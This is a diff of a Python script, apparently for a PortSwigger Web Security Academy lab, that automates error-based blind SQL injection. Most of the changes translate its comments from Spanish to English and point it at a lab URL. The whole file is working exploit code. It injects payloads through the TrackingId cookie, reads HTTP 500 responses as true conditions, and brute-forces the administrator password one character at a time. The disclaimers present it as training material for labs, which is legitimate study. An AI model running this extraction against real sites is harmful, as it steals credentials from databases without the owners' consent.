@@ -1,49 +1,45 @@
-"""
-PortSwigger Web Security Academy
-Lab: Blind SQL Injection (Error-Based)
----------------------------------------
+#!/usr/bin/env python3
 
-Este script corresponde a la resolución AUTOMATIZADA de un laboratorio
-educativo de PortSwigger Web Security Academy.
+# PortSwigger Web Security Academy
+# Lab: Blind SQL Injection (Error-Based)
 
-La técnica utilizada es Blind SQL Injection tipo error-based, donde se
-infieren condiciones verdaderas a partir de errores del servidor (HTTP 500).
+# This script automates the exploitation of a blind SQL injection
+# vulnerability using an error-based technique.
 
- NO usar en sistemas reales sin autorización.
-"""
+# True conditions are inferred by triggering database errors that
+# result in HTTP 500 responses.
+
+# For educational purposes only.
+# Do NOT use against real systems without explicit authorization.
 
 import requests
 import string
 import urllib3
 
-# ================= CONFIG =================
+# CONFIGURATION
 
-# URL de laboratorio (ejemplo local / lab)
-LAB_URL = "http://localhost:8080/lab"
+# Target lab URL 
+LAB_URL = "https://<lab-id>.web-security-academy.net"
 
-# Sesión ficticia / de laboratorio
+# Valid session cookie 
 SESSION_COOKIE = "LAB_SESSION"
 
-# Charset  usado en labs de PortSwigger
+# Character set used during brute-force extraction
 CHARSET = string.ascii_lowercase + string.digits
 
-# Longitud conocida del password del lab
+# Known password length for the lab scenario
 PASSWORD_LENGTH = 20
 
-# Cookie base usada por el lab
+# Base value for the vulnerable TrackingId cookie
 TRACKING_ID_BASE = "TRACKINGID"
 
-# Desactivar warnings SSL 
+# Disable SSL warnings (lab environment)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ==========================================
-
-
 def condition_is_true(payload: str) -> bool:
-    """
-    Envía la inyección SQL al laboratorio y determina si la condición
-    es verdadera en base al código de respuesta HTTP.
-    """
+    # Sends the SQL injection payload and determines whether
+    # the injected condition is TRUE based on the HTTP response code
+
     cookies = {
         "TrackingId": TRACKING_ID_BASE + payload,
         "session": SESSION_COOKIE
@@ -55,19 +51,18 @@ def condition_is_true(payload: str) -> bool:
         verify=False
     )
 
-    # En este lab, un error 500 indica condición TRUE
+    # HTTP 500 indicates a TRUE condition in this lab
     return response.status_code == 500
 
 
 def extract_admin_password() -> str:
-    """
-    Extrae carácter por carácter la contraseña del usuario 'administrator'
-    explotando una Blind SQL Injection error-based.
-    """
+    # Extracts the administrator password character by character
+    # using error-based blind SQL injection
+
     extracted_password = ""
 
     for position in range(1, PASSWORD_LENGTH + 1):
-        print(f"[+] Extrayendo carácter {position}...")
+        print(f"[+] Extracting character {position}...")
 
         for char in CHARSET:
             payload = (
@@ -79,7 +74,7 @@ def extract_admin_password() -> str:
 
             if condition_is_true(payload):
                 extracted_password += char
-                print(f"[✔] Password parcial: {extracted_password}")
+                print(f"[✔] Partial password: {extracted_password}")
                 break
 
     return extracted_password
@@ -87,4 +82,4 @@ def extract_admin_password() -> str:
 
 if __name__ == "__main__":
     password = extract_admin_password()
-    print("\n[✓] Contraseña del lab extraída:", password)
+    print("\n[✓] Extracted password:", password)
